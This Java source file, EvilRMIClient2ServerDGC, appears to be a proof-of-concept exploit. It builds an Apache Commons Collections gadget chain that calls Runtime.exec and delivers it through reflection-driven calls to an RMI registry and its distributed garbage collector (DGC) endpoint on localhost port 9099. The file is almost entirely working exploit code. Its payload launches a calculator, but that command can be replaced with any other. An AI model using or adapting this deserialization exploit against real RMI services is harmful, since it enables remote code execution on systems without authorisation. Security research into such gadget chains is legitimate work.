package org.trganda.client;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.trganda.remote.RemoteService;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.DGCImpl_Stub;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.TransportConstants;

import javax.net.SocketFactory;
import java.io.*;
import java.lang.reflect.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.HashMap;
import java.util.Map;

public class EvilRMIClient2ServerDGC {

    public Object create() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"calc"})
        });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        Constructor annotationInvocationHandler =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
                        getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandler.setAccessible(true);
        InvocationHandler annoHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, lazyMap);

        Map map = (Map) Proxy.
                newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annoHandler);

        InvocationHandler anotherHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, map);

        return anotherHandler;
    }

    public RemoteService getRemoteService(String name) throws RemoteException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        try {
            Field ref = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
            Field operations = registry.getClass().getDeclaredField("operations");
            Field interfaceHash = registry.getClass().getDeclaredField("interfaceHash");

            ref.setAccessible(true);
            operations.setAccessible(true);
            interfaceHash.setAccessible(true);
            RemoteRef refs = (RemoteRef) ref.get(registry);

            Method newCall = refs.getClass().getDeclaredMethod("newCall", RemoteObject.class, Operation[].class, int.class, long.class);
            Method invoke = refs.getClass().getDeclaredMethod("invoke", RemoteCall.class);

            StreamRemoteCall call = (StreamRemoteCall)newCall.invoke(refs, registry, operations.get(registry), 2, interfaceHash.get(registry));
            ObjectOutput out = call.getOutputStream();
            out.writeObject(name);

            invoke.invoke(refs, call);

            return (RemoteService) call.getInputStream().readObject();

        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return null;
    }

    public void callRemote(String name) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);

        try {
            RemoteService rs = getRemoteService(name);
            Field h = rs.getClass().getSuperclass().getDeclaredField("h");
            h.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) h.get(rs);

            Field ref = handler.getClass().getSuperclass().getDeclaredField("ref");
            ref.setAccessible(true);
            UnicastRef unicastRef = (UnicastRef) ref.get(handler);

            Class dgcStub = Class.forName("sun.rmi.transport.DGCImpl_Stub");
            Constructor dgcC = dgcStub.getConstructor(RemoteRef.class);
            DGCImpl_Stub stub = (DGCImpl_Stub) dgcC.newInstance(unicastRef);

            Field operations = stub.getClass().getDeclaredField("operations");
            Field interfaceHash = stub.getClass().getDeclaredField("interfaceHash");

            operations.setAccessible(true);
            interfaceHash.setAccessible(true);

            RemoteCall call = stub.getRef().newCall((RemoteObject) stub, (Operation[]) operations.get(stub), 1, (Long) interfaceHash.get(stub));
            Field liveRef = stub.getRef().getClass().getDeclaredField("ref");
            liveRef.setAccessible(true);
            LiveRef liveRefs = (LiveRef) liveRef.get(stub.getRef());
            Field id = liveRefs.getClass().getDeclaredField("id");
            id.setAccessible(true);
            ObjID objID = (ObjID) id.get(liveRefs);

            ObjectOutput out = call.getOutputStream();

            ObjID[] objIDs = new ObjID[] { new ObjID(2) };

            new ObjID(2).write(out);
            out.writeObject(objIDs);
            out.writeLong(1);
            out.writeObject(create());

            stub.getRef().invoke(call);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            EvilRMIClient2ServerDGC rc = new EvilRMIClient2ServerDGC();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
